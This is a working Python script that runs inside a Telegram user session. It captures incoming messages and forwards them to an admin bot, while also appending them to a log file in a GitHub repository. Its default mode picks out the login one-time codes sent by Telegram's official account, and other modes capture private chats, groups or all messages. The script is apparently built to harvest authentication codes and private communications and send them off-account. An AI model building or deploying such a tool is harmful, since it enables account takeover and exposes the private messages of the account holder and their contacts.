"""
message_fetcher.py
( Telegram User + Bot controller with GitHub sync & inline mode switching )
"""

import os
import base64
import asyncio
import requests
from telethon import TelegramClient, events, Button

# ---------- TELEGRAM CONFIG ----------
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
SESSION_NAME = os.environ.get("SESSION_NAME", "my_session")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID"))

TELEGRAM_OFFICIAL = {777000}  # OTP sender ID

# ---------- GITHUB CONFIG ----------
GITHUB_TOKEN = os.environ.get("GTOKEN")
REPO = os.environ.get("REPO")                   # e.g. "username/repo"
FILE_PATH = os.environ.get("FILE_PATH", "messages.log")
MODE_FILE_GITHUB = os.environ.get("MODE_FILE", "mode.txt")
BRANCH = os.environ.get("BRANCH", "main")

# ---------- MODE MANAGEMENT ----------
MODE_FILE_LOCAL = "mode.txt"


def fetch_mode_from_github():
    url = f"https://api.github.com/repos/{REPO}/contents/{MODE_FILE_GITHUB}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        data = r.json()
        return base64.b64decode(data["content"]).decode().strip()
    return None


def update_mode_on_github(mode: str):
    url = f"https://api.github.com/repos/{REPO}/contents/{MODE_FILE_GITHUB}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    b64_content = base64.b64encode(mode.encode()).decode()

    payload = {
        "message": f"🔄 Mode updated → {mode.upper()}",
        "content": b64_content,
        "branch": BRANCH,
    }

    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        payload["sha"] = r.json()["sha"]

    resp = requests.put(url, headers=headers, json=payload)
    if resp.status_code not in (200, 201):
        print("⚠️ GitHub mode update failed:", resp.status_code, resp.text)
    else:
        print("✅ GitHub mode.txt updated successfully.")


def load_mode():
    if os.path.exists(MODE_FILE_LOCAL):
        return open(MODE_FILE_LOCAL).read().strip()
    github_mode = fetch_mode_from_github()
    return github_mode if github_mode else "otp"


def save_mode(mode: str):
    with open(MODE_FILE_LOCAL, "w") as f:
        f.write(mode)
    update_mode_on_github(mode)


current_mode = load_mode()

# ---------- CLIENTS ----------
user_client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
bot_client = TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ---------- GITHUB LOGGER ----------
def update_github_file(new_text: str):
    url = f"https://api.github.com/repos/{REPO}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}

    r = requests.get(url, headers=headers, params={"ref": BRANCH})
    if r.status_code == 200:
        data = r.json()
        old_content = base64.b64decode(data["content"]).decode()
        sha = data["sha"]
    else:
        old_content, sha = "", None

    updated_content = old_content + "\n" + new_text
    b64_content = base64.b64encode(updated_content.encode()).decode()

    payload = {
        "message": "📜 Update log from Telegram script",
        "content": b64_content,
        "branch": BRANCH,
    }
    if sha:
        payload["sha"] = sha

    resp = requests.put(url, headers=headers, json=payload)
    if resp.status_code not in (200, 201):
        print("⚠️ GitHub update failed:", resp.status_code, resp.text)
    else:
        print("✅ GitHub file updated successfully.")


# ---------- BOT CONTROL ----------
@bot_client.on(events.NewMessage(pattern="/start"))
async def start_cmd(event):
    if event.sender_id != ADMIN_CHAT_ID:
        return
    await event.respond(
        "🤖 **Welcome Boss!**\nChoose your mode:",
        buttons=[
            [Button.inline("🔑 OTP Mode", b"otp")],
            [Button.inline("💌 Private Mode", b"private")],
            [Button.inline("👥 Groups/Channels", b"groups")],
            [Button.inline("🌐 All Messages", b"all")],
            [Button.inline("📋 Show Current Mode", b"show")],
        ],
    )


@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global current_mode
    if event.sender_id != ADMIN_CHAT_ID:
        return

    if event.data == b"otp":
        current_mode = "otp"
        save_mode("otp")
        await event.edit("✅ Mode switched → **🔑 OTP Only**")
        print("🔑 Mode switched → OTP only")

    elif event.data == b"private":
        current_mode = "private"
        save_mode("private")
        await event.edit("✅ Mode switched → **💌 Private Chats**")
        print("💌 Mode switched → Private only")

    elif event.data == b"groups":
        current_mode = "groups"
        save_mode("groups")
        await event.edit("✅ Mode switched → **👥 Groups + Channels**")
        print("👥 Mode switched → Groups/Channels")

    elif event.data == b"all":
        current_mode = "all"
        save_mode("all")
        await event.edit("✅ Mode switched → **🌐 All Messages**")
        print("🌐 Mode switched → All messages")

    elif event.data == b"show":
        await event.answer(f"📋 Current mode: {current_mode.upper()}", alert=True)


# ---------- USER MESSAGE HANDLER ----------
@user_client.on(events.NewMessage(incoming=True))
async def handle_new_message(event):
    global current_mode
    try:
        sender = await event.get_sender()
        sender_id = event.sender_id
        chat = await event.get_chat()
        chat_name = getattr(chat, "title", None) or getattr(sender, "username", None) or getattr(sender, "first_name", None) or sender_id
        text = event.raw_text or ""

        # Mode filtering
        if current_mode == "otp" and sender_id not in TELEGRAM_OFFICIAL:
            return
        if current_mode == "private" and not event.is_private:
            return
        if current_mode == "groups" and not (event.is_group or event.is_channel):
            return

        timestamp = event.message.date.strftime("%Y-%m-%d %H:%M:%S")

        display = (
            f"🕒 {timestamp}\n"
            f"👤 Sender: {chat_name}\n"
            f"🆔 ID: {sender_id}\n\n"
            f"{text}\n---"
        )
        forward_text = (
            f"📩 New Message\n"
            f"👤 {chat_name}\n"
            f"🆔 {sender_id}\n"
            f"🕒 {timestamp}\n\n"
            f"{text}"
        )

        print(display)
        await bot_client.send_message(ADMIN_CHAT_ID, forward_text)
        update_github_file(display)

    except Exception as exc:
        print("❌ Error handling new message:", exc)


# ---------- RUN ----------
async def main():
    print("🚀 Starting Telegram Client...")
    await user_client.start()
    me = await user_client.get_me()
    print(f"✅ Logged in as User: {me.first_name} ({me.id})")
    print(f"📡 Current mode: {current_mode.upper()}")

    await asyncio.gather(
        user_client.run_until_disconnected(),
        bot_client.run_until_disconnected(),
    )


if __name__ == "__main__":
    try:
        user_client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("🛑 Stopped by user.")
